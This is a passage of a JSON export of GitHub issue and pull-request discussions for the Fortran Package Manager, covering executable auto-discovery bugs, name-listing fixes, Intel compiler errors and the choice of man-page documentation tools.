                    "text": "A minor inconsistency. The default search includes the current directory\nwhen anything is found, but if you have no app/ directory it tells you there is nothing to build.\nBut if you explicitly tell it to build a program in the current directory\nyou end up getting two executables if you do not use the default name\nfor your executable.\nI like the concept of having a project in a directory with\nnothing but a source file and an fpm.toml file with external dependencies.\nAnd if I add the auto-executables directive I get the intuitive result.\nSo if I have a directory that contains nothing but \"main.f90\" and the\nfollowing manifest file I get the binary that I was trying to produce (so I\nconsider this the \"minimal project\"). I can see use cases for this where\nI have a program that needs nothing else except external directories.\nCASE I\nname = \"test\"\n[build]\nauto-executables = false\n\n[[executable]]\nname=\"testit\"\nsource-dir=\".\"\nmain=\"main.f90\"\nbut if I just have a manifest with a name in it and the same program file\nCASE II\nname = \"test\"\nI get\nNeither library nor executable found, there is nothing to do\nERROR STOP 1\n\nError termination. Backtrace:\n   :\n   :\n\nSo it acts like the current directory is not automatically searched.\nBut if I change the manifest to\nCASE III\nname = \"test\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\".\"\nmain=\"main.f90\"\nIt builds two executables, main and testit because the code\nautomatically searches the current directory. So to have the minimal\ntwo-file project just generate a single file I have to turn off\nauto-detection.\nThe documentation for the manifest file says it searches in the\ndefault directories, so one suggestion might be that it not search\nthe current directory.\nAnother approach would be to have it find and build without the\nerror message when it finds a program in the current directory instead\nof saying there are not any.\nI think others might argue it should only allow pathnames below the\ncurrent directory but I actually like being able to make a two-file\nproject where the manifest just lists external dependencies. I think\nthis could be a common use of fpm."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-07 17:35:58+00:00",
                    "text": "@urbanjost, I like the idea of a minimal two file project - it was not a test case I thought of testing before. It looks like there's a bug in the source processing of explicit [[executable]] entries; the current/root directory should not be searched by auto-discovery. Both Case I and case III should work, but not case II. I will look into this. Thanks for bringing it up."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 19:14:27+00:00",
                    "text": "That was fast. Perfect for ffpm run **not_there** when there are valid targets. When there are no valid targets a simple ffpm run produces no message, but for consistency should it say \"no valid targets\" or show the same thing that \"ffpm run empty\" did in the directory with no targets in the following sequence of commands? I am fine with it as-is but I think it would be less confusing if you were working with a package you did not create and/or were new to fpm. Really nice work. Least number of comments I think I have ever had for something with so many arbitrary paths through it in an alpha version; and nothing I spotted by eye in the code to comment on at all.\n#!/bin/bash\n(\nexec 2>&1\n set -x\n ffpm run asdf\n ffpm new A -lib\n cd A\n ffpm run     <<<< NO OUTPUT?\n ffpm run empty\n)|tee -a $0\nexit\n################################################################################\n+ ffpm run asdf\nfpm::run<ERROR> specified names \"asdf\" not found.\n\n Available names:\n        box_month              d2j              d2o              d2u\n              d2w   date_to_julian     date_to_unix         days2sec\n              dow           easter          fmtdate    fmtdate_usage\n        guessdate              j2d   julian_to_date             mo2d\n             mo2v    moon_fullness       M_time_oop              now\n              o2d  ordinal_seconds  ordinal_to_date    phase_of_moon\n         sec2days     system_sleep              u2d     unix_to_date\n             v2mo              w2d\nSTOP 1\n+ ffpm new A -lib\n + mkdir -p A\n + cd A\n + mkdir -p A/src\n + git init A\nInitialized empty Git repository in /home/urbanjs/venus/V600/github/M_time/A/.git/\n+ cd A\n+ ffpm run\n+ ffpm run empty\nfpm::run<ERROR> specified names \"empty\" not found.\n\n Available names:\n\nSTOP 1"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 20:35:26+00:00",
                    "text": "This is an edge case but it looks like it would only take a few lines to warn the user something went wrong.\nSince all the applications go into one directory it is relatively easy to create duplicates that collide. So with a manifest\nlike this\nname = \"test\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\".\"\nmain=\"main.f90\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\"other\"\nmain=\"main.f90\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\"other\"\nmain=\"main2.f90\"\nIn a intentionally setup with intentional duplicates both h-fpm and\nf-fpm build all the targets. h-fpm places them in subdirectories\ncorresponding to their original location while f-fpm places them all\nin build/*/app/. h-fpm has no good way to execute them except by the\nbasename that I know of so all the targets exist but it is not without\nissues, but f-fpm overwrites. f-fpm does list them all with\nfpm build --list\nso I think it would be relatively easy to warn when there are duplicate\nbasenames so you know there was an overwrite.\nIn my testcase the filesystem looks like\n./app/main.f90\n./app/main2.f90\n./other/main2.f90\n./other/main.f90\n./other/main3.f90\n\nI agree this an aberrant case but it looks like the warning would be easy\nto produce.\nI much bigger change would be to put the executables into separate directories like h-fpm but unless the run command took subdirectory names that really does not solve the issue; and if the user is warned they can easily (probably) resolve it by giving a unique name to the output executable in the manifest  file."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 23:18:50+00:00",
                    "text": "When I took a second look there is a fixed format of 17 characters, which I sometimes\nexceed.\nAvailable names:\ndemo_system_accesdemo_system_chdirdemo_system_chmoddemo_system_chown                                                               \ndemo_system_cleardemo_system_closedemo_system_cpu_tdemo_system_errno                                                               \ndemo_system_getcwdemo_system_getegdemo_system_getendemo_system_geteu                                                               \ndemo_system_getgidemo_system_getgrdemo_system_gethodemo_system_getlo                                                               \ndemo_system_getpidemo_system_getppdemo_system_getpwdemo_system_getsi                                                               \ndemo_system_getuidemo_system_getumdemo_system_initedemo_system_isblk                                                               \ndemo_system_ischrdemo_system_isdirdemo_system_isfifdemo_system_islnk                                                               \ndemo_system_isregdemo_system_issoc demo_system_kill demo_system_link                                                               \ndemo_system_mkdirdemo_system_mkfifdemo_system_opend demo_system_perm                                                               \ndemo_system_perrodemo_system_puten demo_system_randdemo_system_readd                                                               \ndemo_system_readedemo_system_realpdemo_system_removdemo_system_renam                                                               \ndemo_system_rewindemo_system_rmdirdemo_system_setsidemo_system_setum                                                               \ndemo_system_sranddemo_system_unamedemo_system_unlindemo_system_unset                                                               \ndemo_system_utime\nSTOP 1diff --git a/fpm/src/fpm.f90 b/fpm/src/fpm.f90I did ask for this :>. \n\nI cleaner way would require two passes to find the longest string I think. Maybe there is a simpler way you see. A kludge that\nmakes sure nothing is truncated without taking a second pass worked. It would not keep columns aligned but it would prevent truncattion:\nindex 31927fc..d852cb6 100644\n--- a/fpm/src/fpm.f90\n+++ b/fpm/src/fpm.f90\n@@ -304,7 +304,7 @@ subroutine cmd_run(settings,test)\n     class(fpm_run_settings), intent(in) :: settings\n     logical, intent(in) :: test\n \n-    integer :: i, j\n+    integer :: i, j, column_width\n     logical :: found(size(settings%name))\n     type(error_t), allocatable :: error\n     type(package_t) :: package\n@@ -382,8 +382,8 @@ subroutine cmd_run(settings,test)\n \n         j = 1\n         write(stderr,*) 'Available names:'\n+        column_width=17\n         do i=1,size(model%targets)\n-\n             exe_target => model%targets(i)%ptr\n     \n             if (exe_target%target_type == FPM_TARGET_EXECUTABLE .and. &\n@@ -394,7 +394,9 @@ subroutine cmd_run(settings,test)\n                 if (exe_source%unit_scope == &\n                     merge(FPM_SCOPE_TEST,FPM_SCOPE_APP,test)) then \n \n-                    write(stderr,'(A17)',advance=(merge(\"yes\",\"no \",modulo(j,4)==0))) basename(exe_target%output_file)\n+                    column_width=max(column_width,len(basename(exe_target%output_file))+1)\n+                    write(stderr,'(A)',advance=(merge(\"yes\",\"no \",modulo(j,4)==0))) &\n+                    & [character(len=column_width) ::basename(exe_target%output_file)]\n \n                     j = j + 1\nfpm::run<ERROR> specified names \"asdf\" not found.\n\n Available names:\ndemo_system_access demo_system_chdir  demo_system_chmod  demo_system_chown  \ndemo_system_clearenv demo_system_closedir demo_system_cpu_time demo_system_errno    \ndemo_system_getcwd   demo_system_getegid  demo_system_getenv   demo_system_geteuid  \ndemo_system_getgid   demo_system_getgrgid demo_system_gethostname demo_system_getlogin    \ndemo_system_getpid      demo_system_getppid     demo_system_getpwuid    demo_system_getsid      \ndemo_system_getuid      demo_system_getumask    demo_system_initenv     demo_system_isblk       \ndemo_system_ischr       demo_system_isdir       demo_system_isfifo      demo_system_islnk       \ndemo_system_isreg       demo_system_issock      demo_system_kill        demo_system_link        \ndemo_system_mkdir       demo_system_mkfifo      demo_system_opendir     demo_system_perm        \ndemo_system_perror      demo_system_putenv      demo_system_rand        demo_system_readdir     \ndemo_system_readenv     demo_system_realpath    demo_system_remove      demo_system_rename      \ndemo_system_rewinddir   demo_system_rmdir       demo_system_setsid      demo_system_setumask    \ndemo_system_srand       demo_system_uname       demo_system_unlink      demo_system_unsetenv    \ndemo_system_utime       \nSTOP 1\n\nI was looking for a quick way to find the longest name and did not see it off the bat and thought I would show you this first before looking deeper. Maybe just listing the basenames instead of the table is simpler. I do not know how common having this many applications or tests is. I happen to try to have a demo as part of each manpage; which can add up quickly."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 23:32:08+00:00",
                    "text": "FYI: worked very nicely with a module of mine called M_system that contained a C file that required me to use an fpm..mk file with h-fpm. Refactoring all my fpm packages to work with f-fpm; which is breaking some of them for use with h-fpm. I am putting a note in the README.md files on the github sites to that effect, but a number of them are listed in the fpm registry which causes some confusion. I think I need to add a rev to the FPM registry files to point to the older ones"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-08 22:16:47+00:00",
                    "text": "All the other tests I have passed other than what I commented on.  I am moving a few repositories to use the new fpm but unless I stumble on something all my tests are complete. Seems like a bootstrappable single Fortran file would be due for people to experiment with?  They would just need a Fortran compiler and gfortran. build, run, test, new, help all function, the TOML interface and build with a remote dependency works,  the auto-discovery makes for some simple manifest files. Some people might be able to give feedback more readily if they just have to pull  a file down and compile it with the language they are developing in.  Still cannot do custom build scripts, add external libraries, options of OpenMP, OpenACC, MPI, Coarrays, ... but getting pretty useful."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-11 02:04:58+00:00",
                    "text": "A build of this branch placed into a single file and built with a simple \"gfortran ffpm.f90\" on a machine with git and gfortran but no bootstrap version built and ran all the repositories in the fpm registry except one that got a compiler error (it was gfortran 10.0) that was part of the package and not an fpm issue. I could build run and test (and help and new which were not really being changed) in all those packages.\nThe only problem I had was on a CygWin machine where I had to unset the OS environment variable in order for the code to select OS_TYPE=cygwin instead of MSWindows. I think that is a seperate issue to resolve in a new PR.\nOut of my own fpm packages the only one I cannot build is one that requires the X11 Windows libraries, which was expected as custom build scripts are not supported yet, nor are user-supplied load and compiler switches. Nice job."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-11 02:19:14+00:00",
                    "text": "PS:\nwget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90 \ngfortran ffpm.f90 -o ffpm\nI am going to leave the file ffpm.f90 available for a week that can be accessed via a browser or something like the wget(1) above.  If anyone has access to compilers other than gfortran I am very curious if the file compiles and runs. The fiile is fpm #229."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-11 08:58:28+00:00",
                    "text": "I have used Intel Fortran version 2018 to compile the file. It produced\nquite a few error messages - see the attachment.\n\nTwo of the error messages were easily corrected - stop abs(sig) is not\nallowed - stop comes with a constant only - and the message about\nallocating a zero-length string disappears when you change the asterisk to\na colon. However, the messages about get_value are more demanding. I have\nnot looked at them in any detail :)\n\nOp wo 11 nov. 2020 om 03:19 schreef urbanjost <notifications@github.com>:\n PS:\n\n wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n gfortran ffpm.f90 -o ffpm\n\n I am going to leave the file ffpm.f90 available for a week that can be\n accessed via a browser or something like the *wget(1)* above. If anyone\n has access to compilers other than gfortran I am very curious if the file\n compiles and runs. The fiile is fpm #229\n <#229>.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#229 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6OYXSQ2NVJTMFNGY3SPHYDBANCNFSM4TMSJTHQ>\n .\n\nIntel(R) Visual Fortran Intel(R) 64 Compiler for applications running on Intel(R) 64, Version 18.0.5.274 Build 20180823\nCopyright (C) 1985-2018 Intel Corporation.  All rights reserved.\n\nffpm.f90(1836): error #8231: In an ALLOCATE statement the type parameter values in type specification shall be an asterisk if and only if each object being allocated is a dummy argument for which the type parameter is assumed.   [STRINGS]\n         allocate(character(len=0)::strings(0))\n------------------------------------^\nffpm.f90(1841): error #8231: In an ALLOCATE statement the type parameter values in type specification shall be an asterisk if and only if each object being allocated is a dummy argument for which the type parameter is assumed.   [STRINGS]\n      allocate(character(len=0)::strings(0))\n---------------------------------^\nffpm.f90(2659): remark #8291: Recommended relationship between field width 'W' and the number of fractional digits 'D' in this edit descriptor is 'W>=D+7'.\n         read(nan_string,'(g3.3)')valu\n----------------------------^\nffpm.f90(5230): error #6345: Either a PAUSE, STOP or ERROR STOP statement has an invalid argument.   [ABS]\n      stop abs(sig)\n-----------^\nffpm.f90(6756): warning #6843: A dummy argument with an explicit INTENT(OUT) declaration is not given an explicit value.   [SELF]\nsubroutine new_keyval(self)\n----------------------^\nffpm.f90(10108): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10146): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10184): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10222): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10260): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10298): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10336): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10374): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10409): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10439): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10469): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10499): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10529): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10559): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10589): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10619): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10946): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(10974): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11002): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11030): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11058): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11086): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11114): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11142): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11170): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11174): error #6285: There is no matching specific subroutine for this generic subroutine call.   [ADD_KEYVAL]\n         call add_keyval(array, ptr, stat)\n--------------^\nffpm.f90(11204): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11446): catastrophic error: Too many errors, exiting\ncompilation aborted for ffpm.f90 (code 1)"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-11 13:43:05+00:00",
                    "text": "Thanks. That is basically all one issue I believe.  Interesting differences."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-11 13:49:38+00:00",
                    "text": "I have used Intel Fortran version 2018 to compile the file. It produced\nquite a few error messages - see the attachment.\n\n@arjenmarkus I'm responsible for parts of those issues with TOML-Fortran (get_value, see toml-f/toml-f#16), but those are now fixed with the v0.2.1 release and will be used in fpm with #233."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-11 19:24:16+00:00",
                    "text": "I'm responsible for parts of those issues with TOML-Fortran (get_value, see toml-f/toml-f#16), but those are now fixed with the v0.2.1 release and will be used in fpm with #233.\n\n@LKedward @awvwgk Considering this, is there a preferred order to merging? Should this PR wait for #233 or it doesn't matter?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-11 21:02:11+00:00",
                    "text": "Doesn't matter too much. In case there is a fix required in this PR as well, updating the TOML-Fortran dependency is just a simple patch version bump:\ndiff --git a/fpm/fpm.toml b/fpm/fpm.toml\nindex fc3a381..404e65c 100644\n--- a/fpm/fpm.toml\n+++ b/fpm/fpm.toml\n@@ -8,7 +8,7 @@ copyright = \"2020 fpm contributors\"\n [dependencies]\n [dependencies.toml-f]\n git = \"https://github.com/toml-f/toml-f\"\n-tag = \"v0.2\"\n+tag = \"v0.2.1\"\n \n [dependencies.M_CLI2]\n git = \"https://github.com/urbanjost/M_CLI2.git\""
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-12 08:52:32+00:00",
                    "text": "The fix isn't required for this PR and I have no preferred order of merging."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-12 19:05:32+00:00",
                    "text": "Sounds good, I will merge this."
                }
            ]
        },
        {
            "number": 228,
            "user": "LKedward",
            "date": "2020-11-06 08:37:35+00:00",
            "title": "Implement [test.dependencies] and [executable.dependencies]",
            "text": "Support for this manifest syntax was left out of #193.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-12 10:53:17+00:00",
                    "text": "Fixed by #266"
                }
            ]
        },
        {
            "number": 227,
            "user": "awvwgk",
            "date": "2020-11-04 21:17:16+00:00",
            "title": "Create a specification for the command line interface",
            "text": "To make clear what we expect from the command line interface we should create a specification of the current command line interface, similar to the specification for the manifest format. First, it allows to check for consistency for between the bootstrap and the Fortran version and gives a clear reference what to expect from an fpm implementation (of whatever kind). Also, it allows to propose new functionality independently of an implementation.\nGood material might be the dub or cargo reference\n\nhttps://dub.pm/commandline\nhttps://doc.rust-lang.org/cargo/commands/index.html\n\nThe format should probably be man page compatible, preferably markdown, such that we can include it on the online documentation with various tools (FORD, jekyll, ...) and also translate it to roff. I personally prefer asciidoc to write man pages, which is translatable to roff and compatible with jekyll but probably not with FORD.\nAny other opinion or suggestions on this?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-05 09:37:13+00:00",
                    "text": "Yes this is definitely needed; we have two slightly divergent CLIs currently. I don't have experience with asciidoc, but I agree that it would be good to have man page compatibility for this. I don't see FORD compatibility as a necessity for this."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 01:53:48+00:00",
                    "text": "I use txt2man(1) markup myself so I have not tried asciidoc although I have heard about it. In my own environment the manpage document is written as text blocks in the Fortran source file and extracted and usuallly also converted to comments or a text variable declaration by a preprocessor which works the way I like (documentation, Fortran source all in one file and automatically converted to roff and then (via man2html or groff) converted to HTML) but I don't expect the rest of the world to do that.\nThat being said, txt2man is widely available, simple, and works reasonably well for basic manpages. I keep meaning to make a Fortran program that is the equivalent but do not.\nThis is particularly apt as I was just going to open an issue and ask if we wanted to add a CLI option to specify custom compiler options like h-fpm recently added; but was thinking the syntax `fpm build -- -arg1 opt1 -arg2 -arg3... would be the easiest to implement and be a little easier to use but would be a different syntax for f-fpm than h-fpm. Wanted feedback on how people felt about it at all and what experiences everyone was having with the h-fpm version but the topics overlap; and at a minimum highlight the question of whether h-fpm and f-fpm need to stay in sync or not."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 03:15:28+00:00",
                    "text": "Note that fpm help manual writes out a file that was essentially written in txt2man markdown. Each help section was designed to be converted to roff via txt2man(1). The roff can then be converted to html, which can display on a github page if you turn on the doc section, or github markup allows you to put HTML into a md file by putting <? above the HTML; although a little tweaking was involved. I had put that file in the fpm repository for easier review of the documentation at one point.\nIt needs a little tweaking, but\nmozilla.pdf"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-09 08:58:19+00:00",
                    "text": "@urbanjost Thanks for mentioning txt2man. This would be an alternative to consider. I mainly opened this issue to discuss and agree on tools for this purpose. I'm also happy to try something other than asciidoc for this purpose as well.\nI wonder if txt2man is actually a cross-platform tool or if it is limited to Unix systems since it is written in bash/gawk (using GNU extensions)? I used txt2man a bit after you brought it up with the intrinsics module, the one thing I noticed is that it can become quite slow when converting several text files.\nI want to decouple the Fortran or Haskell implementation from the specification on purpose. I think it makes more sense to document the wanted behaviour and than to provide the matching implementation. I would take the Fortran version as ground of truth for now.\n\nWanted feedback on how people felt about it at all and what experiences everyone was having with the h-fpm version but the topics overlap; and at a minimum highlight the question of whether h-fpm and f-fpm need to stay in sync or not.\n\nI would very much like them to stay in sync, having a common documentation and force to document any deviating behaviour might help with this.\n\nThis is particularly apt as I was just going to open an issue and ask if we wanted to add a CLI option to specify custom compiler options like h-fpm recently added; but was thinking the syntax `fpm build -- -arg1 opt1 -arg2 -arg3... would be the easiest to implement\n\nPlease go ahead and open a new issue, I have a few suggestions for this."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 22:25:56+00:00",
                    "text": "I created #261 using markdown to write the man page and convert it using pandoc. There is also #230 using asciidoc as markup language and using asciidoctor to convert to roff and HTML. If there is interest I can create another PR with txt2man.\nI would suggest that we review the PRs under consideration of:\n\nsetup/usage of the toolchain\nthe markup language to express the command line documentation\nthe output (both HTML and roff/man page)\nthe preview on GH\n\nAny other point we should look out for?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-06 01:07:13+00:00",
                    "text": "I had something in mind that at some point we would have as part of a package a doc directory and that the install command could look at the suffix of the files and place at least common formats in an \"installed\" location.  Not really familiar with some of the other tools mentioned but I am assuming the processing would be done by the fpm developers to a few formats so users would not have to install a lot of software just to read the document.  At a minimum I want the help text of the program to be relatively complete and to contain links to WWW resources as appropriate, and for a manual to be availble in a PDF format. I am not quite sure if you are talking about documentation distributed as part of fpm for users or developer documentation or both?\nThe help text was written specifically with it in mind that it could be converted to manpages and HTML and a PDF easilly, so I picked txt2man(1) because it is formatted completely with flat text and whitespace. So the direction is 'fpm help TOPIC|txt2man >TOPIC.1fpm or >fpm-TOPIC.1.  It seems like this would require the opposite process where the documents are maintained external to the program.  MSWindows (except in CygWin).  With fpm changing rapidly the potential for a mismatch between documentation and the version being used at this point seems high unless the documentation is in the code or distributed with each release. For now the simplest solution seemed to be to make sure at least basic documentation is built in.  Do other packages use a second application when help is called, or do they contain basic documentation built in?  The basic functionality I was modeling was largely based on cargo (and that is similar to what I normally do, so I am perhaps biased). Should all documentation or almost all go to a compantion program perhaps called fpm-help?  What do you see a new user having to do to access documentation? There not being any universal format for this I have pondered exactly what we can do so if you have a lot of dependencies in a program that you have documentation for the packages; ideally even on a platform not connected to a network or where users cannot install additional packages easily."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-06 14:13:59+00:00",
                    "text": "You give me quite a lot to think about. I will try to comment on the first part for now and come back later for the remainder.\nIn reverse order.\n\nI am not quite sure if you are talking about documentation distributed as part of fpm for users or developer documentation or both?\n\nI was thinking about user documentation which we can distribute with fpm once we have a fully functional fpm-install command.\n\nAt a minimum I want the help text of the program to be relatively complete and to contain links to WWW resources as appropriate, and for a manual to be availble in a PDF format.\n\nI agree. HTML and PDF is as far as I know something all three so far suggested tools can easily provide.\n\nNot really familiar with some of the other tools mentioned but I am assuming the processing would be done by the fpm developers to a few formats so users would not have to install a lot of software just to read the document.\n\nYes this is one of my main concern, whatever we choose should be immediately accessible by the user. The lowest barrier for interacting with the fpm documentation is currently visiting this repository via the GitHub web interface, therefore I think it is a great plus point if our approach allows a decent preview in the web interface by itself. Also important is how well the documentation works from the cloned git repository in a plain text editor, like nvim or emacs, or in an IDE, which might also provide a preview for certain formats. Also here if the format is reasonable readable without processing I consider this a great plus.\nThis becomes less of an issue once we have a dedicated place to display fpm specific documentation at https://fortran-lang.org or someplace else, because here we can easily show the processed output.\n\nI had something in mind that at some point we would have as part of a package a doc directory and that the install command could look at the suffix of the files and place at least common formats in an \"installed\" location.\n\nThis is definitely something I want to look into once we have included the fpm-install command. One possibility would be to extend the proposed [install] table with documentation or have a separate [documentation] table to specify the tools specify the sources and the tools required."
                }
            ]
        },
        {
            "number": 226,
            "user": "everythingfunctional",
            "date": "2020-11-02 20:35:33+00:00",
            "title": "Fix rebuilding executables when libraries change",
            "text": "Fix #222",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-04 15:02:27+00:00",
                    "text": "This is a very small change which clearly fixes the issue, so I will now merge."
                }
            ]
        },
        {
            "number": 225,
            "user": "LKedward",
            "date": "2020-11-01 15:25:45+00:00",
            "title": "Refactor backend for static libraries",
            "text": "The current implementation doesn't have any internal distinction between a source file and a build target; this was for parsimony in getting the fortran version working, but it limits the backend.\nIn this PR there is now a separate internal representation for build targets. This simplifies the backend and now allows static libraries to be built (Resolves #217).\nIn summary:\n\nsource level semantics (modules used/provided etc) are in type(srcfile_t)\nbuild level semantics (dependencies, object type) are in type(build_target_t)\n\nThis refactoring is also necessary for #212 which will come in a separate PR.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-06 06:56:44+00:00",
                    "text": "So far:Getting excitingly close to a fully functional fortran version!\n\nI have some test programs with dependencies for just the test programs.\nI cannot seem to get test.dependencies to work. For example, for the\nsimple modules in (\"https://github.com/urbanjost/M_calculator.git\")\nI have to have the dependency specifed in the [library] section instead\nof in in [test.dependensices.]\n[M_calculator](https://github.com/urbanjost/M_calculator.git)\nis a simple project that demonstrates this.\n# If I remove this this repository does not build properly\nM_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\nname = \"M_calculator\"\nversion = \"0.1.0\"\nlicense = \"Public Domain\"\nauthor = \"John S. Urban\"\nmaintainer = \"urbanjost@comcast.net\"\ncopyright = \"2020 John S. Urban\"\ndescription = \"basic numeric expression parser\"\n\n[library]\nsource-dir=\"src\"\n[dependencies]\n#### If I remove this it does not build properly\nM_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\n\n[[test]]\nname=\"runTests\"\nsource-dir=\"test/test_suite\"\nmain=\"test_suite_M_calculator.f90\"\n[test.dependencies]\nM_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\n\n[[executable]]\nname=\"compute\"\nsource-dir=\"app\"\nmain=\"compute.f90\"\ncannot use multi-module file as a remote dependency\nAlso, I can build a file with multiple modules in it, but when I use\nthose modules as a remote dependency for another module it fails.\nIs that intentional?\nfix \"run\" and \"test\" to simplify testing\nIn the new version since all the applications are built in the app/ and test/ directory the\nrun_cmd() and test_cmd() need the following changes. I could make a separate PR for the\nchange but it makes testing far easier and is a trivial change:\ndiff --git a/fpm/src/fpm.f90 b/fpm/src/fpm.f90\n-            fname=join_path('build',release_name,package%executable(i)%source_dir,package%executable(i)%name)\n+            fname=join_path('build', release_name, 'app', package%executable(i)%name)\n\n-                    fname=join_path('build',release_name,package%executable(i)%source_dir,package%executable(i)%name)\n+                    fname=join_path('build', release_name, 'app', package%executable(i)%name)\n\n-            fname=join_path('build',release_name,package%test(i)%source_dir,package%test(i)%name)\n+            fname=join_path('build', release_name, 'test', package%test(i)%name)\n\n-                    fname=join_path('build',release_name,package%test(i)%source_dir,package%test(i)%name)\n+                    fname=join_path('build', release_name, 'test', package%test(i)%name)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-06 08:42:16+00:00",
                    "text": "Thanks for the feedback @urbanjost, as always this is really useful!\n\nI cannot seem to get test.dependencies to work.\n\nYes this was an oversight when I implemented the remote dependencies; I implemented the [dev-dependencies] syntax but not the [test.dependencies] syntax. You should be able to get your test packages working by using [dev-dependencies] for the time-being. I've opened #228 to track this.\n\nAlso, I can build a file with multiple modules in it, but when I use those modules as a remote dependency for another module it fails. Is that intentional?\n\nThis is not intentional and is a bug. I haven't been able to reproduce with a basic example, can you provide more information on the failure?\n\nIn the new version since all the applications are built in the app/ and test/ directory the\nrun_cmd() and test_cmd() need the following changes.\n\nThanks yes this is a simple fix which I should implement in this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-06 11:43:49+00:00",
